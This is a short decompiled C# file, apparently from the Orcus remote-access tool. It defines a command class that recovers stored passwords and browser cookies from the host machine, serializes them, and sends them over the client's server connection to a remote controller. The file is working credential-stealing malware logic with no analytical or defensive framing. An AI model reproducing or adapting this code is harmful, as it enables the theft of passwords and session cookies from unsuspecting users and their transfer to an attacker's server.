using Orcus.Commands.Passwords;
using Orcus.Plugins;
using Orcus.Plugins.StaticCommands;
using Orcus.Shared.Commands.Password;
using Orcus.Shared.Connection;
using Orcus.Shared.NetSerializer;
using Orcus.StaticCommands.Client;

namespace Orcus.StaticCommands;

public class PasswordRecoveryCommandEx : PasswordRecoveryCommand
{
	public override void Execute(CommandParameter commandParameter, IFeedbackFactory feedbackFactory, IClientInfo clientInfo)
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		PasswordData passwords = PasswordsCommand.GetPasswords(recoverCookies: true);
		byte[] array = new Serializer(typeof(PasswordData)).Serialize((object)passwords);
		clientInfo.get_ServerConnection().SendServerPackage((ServerPackageType)0, array, false, (ushort)0);
	}
}
